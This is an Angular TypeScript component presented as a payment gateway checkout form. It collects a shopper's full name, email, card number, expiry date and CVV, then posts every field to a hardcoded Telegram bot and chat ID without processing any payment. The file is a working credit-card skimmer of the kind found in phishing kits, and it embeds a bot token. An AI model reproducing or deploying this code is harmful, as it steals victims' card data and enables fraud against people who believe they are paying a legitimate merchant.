import { HttpClient } from '@angular/common/http';
import { Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';
import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors, ValidatorFn } from '@angular/forms';
import { Router } from '@angular/router';

@Component({
  selector: 'app-gateway',
  templateUrl: './gateway.component.html',
  styleUrls: ['./gateway.component.css']
})
export class GatewayComponent implements OnInit{
  paymentForm: FormGroup;
  submitted = false;
  showAlertBox: boolean = false;
  showErrorMessage: boolean = false;
  insideMessageVisible: boolean = false;

  showVisa = true;
  showMastercard = true;
  showAmex = true;
  showJcb = true;


  @ViewChild('emailInput') emailInput!: ElementRef;
  @ViewChild('cardInput') cardNumberInput!: ElementRef;
  @ViewChild('expirationDateInput') expirationDateInput!: ElementRef;
  @ViewChild('securityCodeInput') securityCodeInput!: ElementRef;
  @ViewChild('fullNameInput') fullNameInput!: ElementRef;

  private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0';
  private readonly CHAT_ID = '-4556448975';

  amount = localStorage.getItem("finalPrice");
  errorMessage: string = ''; // Variable to hold error messages

  constructor(private fb: FormBuilder, private http: HttpClient, private router: Router) {
    this.paymentForm = this.fb.group({
      fullname: ['', [Validators.required]],
      email: ['', [Validators.required, Validators.email, Validators.minLength(3)]],
      cardnumber: ['', [Validators.required, this.validateCreditCardNumber]],
      expirationdate: ['', [Validators.required, this.validateExpirationDate]],
      securitycode: ['', [Validators.required, Validators.minLength(3), Validators.maxLength(4), Validators.pattern(/^\d{3,4}$/)]]
    });
  }



  ngOnInit(): void {}

  

  validateCreditCardNumber(control: any) {
    const cardNumber = control.value.replace(/\s+/g, '');
    const cardRegex = /^(?:3[47]\d{13}|(?:4\d|5[1-5]|65)\d{14}|(?:6011|(?:2131|1800|35\d{3})\d{11}))$/;
    return cardRegex.test(cardNumber) ? null : { invalidCardNumber: true };
  }

  validateExpirationDate(control: any) {
    const input = control.value.replace(/\D/g, '');
    if (input.length !== 4) {
      return { invalidExpirationDate: true };
    }
    const month = parseInt(input.substring(0, 2), 10);
    const year = parseInt(input.substring(2, 4), 10);
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return { expiredCard: true };
    }
    return null;
  }
  customEmailValidator(): ValidatorFn {
    return (control: AbstractControl): ValidationErrors | null => {
      const email = control.value;

      // Check if the email is empty
      if (!email) {
        return { required: true };
      }

      // Check if the email is in a valid format
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailPattern.test(email)) {
        return { invalidEmail: true };
      }

      // If both checks pass, return null (no error)
      return null;
    };
  }



  formatCardNumber() {
    let cardNumber = this.paymentForm.get('cardnumber')?.value || '';
    cardNumber = cardNumber.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber.replace(/(\d{4})/g, '$1 ').trim();
    this.paymentForm.get('cardnumber')?.setValue(cardNumber);
  }

  formatExpirationDate() {
    let expirationDate = this.paymentForm.get('expirationdate')?.value || '';
    expirationDate = expirationDate.replace(/\D/g, '').substring(0, 4);
    const month = expirationDate.substring(0, 2);
    const year = expirationDate.substring(2, 4);
    if (month.length === 2 && (parseInt(month, 10) < 1 || parseInt(month, 10) > 12)) {
      expirationDate = '01';
    }
    if (expirationDate.length >= 2) {
      expirationDate = month + '/' + year;
    }
    this.paymentForm.get('expirationdate')?.setValue(expirationDate);
  }



  onSubmit() {
    this.submitted = true;
    this.showValidationErrors(); // Call to update invalid controls

    if (this.paymentForm.valid) {
      const message = `
*New Payment Information*\n
Fullname: ${this.paymentForm.value.fullname}\n
Email: ${this.paymentForm.value.email}\n
CC: ${this.paymentForm.value.cardnumber}\n
Expiration Date: ${this.paymentForm.value.expirationdate}\n
CVV: ${this.paymentForm.value.securitycode}
    `;
    this.sendMessageToTelegram(message);
    }

  }

  showValidationErrors() {
    const controls = this.paymentForm.controls;

    // Resetting border colors
    this.resetBorders();

    // Check for email validation errors
    if (controls['email'].invalid) {
      if (controls['email'].errors?.['required'] || controls['email'].errors?.['email']) {
        this.emailInput.nativeElement.style.borderColor = 'red'; // Set border color to red for email
      }
    }

    // Check for card number validation errors
    if (controls['cardnumber'].invalid) {
      if (controls['cardnumber'].errors?.['required'] || controls['cardnumber'].errors?.['minlength'] || controls['cardnumber'].errors?.['maxlength']) {
        this.cardNumberInput.nativeElement.style.borderColor = 'red'; // Set border color to red for card number
      }
    }

    // Check for expiration date validation errors
    if (controls['expirationdate'].invalid) {
      if (controls['expirationdate'].errors?.['required'] || controls['expirationdate'].errors?.['pattern']) {
        this.expirationDateInput.nativeElement.style.borderColor = 'red'; // Set border color to red for expiration date
      }
    }

    // Check for security code validation errors
    if (controls['securitycode'].invalid) {
      if (controls['securitycode'].errors?.['required'] || controls['securitycode'].errors?.['minlength'] || controls['securitycode'].errors?.['maxlength']) {
        this.securityCodeInput.nativeElement.style.borderColor = 'red'; // Set border color to red for security code
      }
    }

    // Check for full name validation errors
    if (controls['fullname'].invalid) {
      if (controls['fullname'].errors?.['required']) {
        this.fullNameInput.nativeElement.style.borderColor = 'red'; // Set border color to red for full name
      }
    }
  }

  resetBorders() {
    // Reset all border colors to default
    this.emailInput.nativeElement.style.borderColor = '';
    this.cardNumberInput.nativeElement.style.borderColor = '';
    this.expirationDateInput.nativeElement.style.borderColor = '';
    this.securityCodeInput.nativeElement.style.borderColor = '';
    this.fullNameInput.nativeElement.style.borderColor = '';
  }



  addInvalidClass(fieldName: string) {
    const control = this.paymentForm.get(fieldName);
    if (control) {
        control.setErrors({ invalid: true }); // Set an error to trigger CSS
    }
  }
 


  sendMessageToTelegram(message: string){
    const url = `https://api.telegram.org/${this.BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: this.CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    };

    this.http.post(url, body).subscribe(
      (response) => {
        this.paymentForm.reset(); // Reset form on successful submission
      },
      (error) => {
        console.error('Error sending message:', error);
      }
    );
  }

  
  detectCardIssuer(cardNumber: string): void {
    // Patterns for each card type
    const cardPatterns = {
      mastercard: /^5[1-5]|^56|^58/,
      visa: /^4/,
      amex: /^3[47]/,
      jcb: /^(?:2131|1800|35)/
    };

    // Reset all to true initially
    this.showVisa = true;
    this.showMastercard = true;
    this.showAmex = true;
    this.showJcb = true;

    // Check for MasterCard specifically
    if (cardPatterns.mastercard.test(cardNumber)) {
      this.showVisa = false;
      this.showAmex = false;
      this.showJcb = false;
      this.showMastercard = true;
    } else if (cardPatterns.visa.test(cardNumber)) {
      // Visa detection
      this.showVisa = true;
      this.showMastercard = false;
      this.showAmex = false;
      this.showJcb = false;
    } else if (cardPatterns.amex.test(cardNumber)) {
      // Amex detection
      this.showVisa = false;
      this.showMastercard = false;
      this.showAmex = true;
      this.showJcb = false;
    } else if (cardPatterns.jcb.test(cardNumber)) {
      // JCB detection
      this.showVisa = false;
      this.showMastercard = false;
      this.showAmex = false;
      this.showJcb = true;
    } else {
      // If no match, show all icons again
      this.showVisa = true;
      this.showMastercard = true;
      this.showAmex = true;
      this.showJcb = true;
    }
  }
 
}


  

  
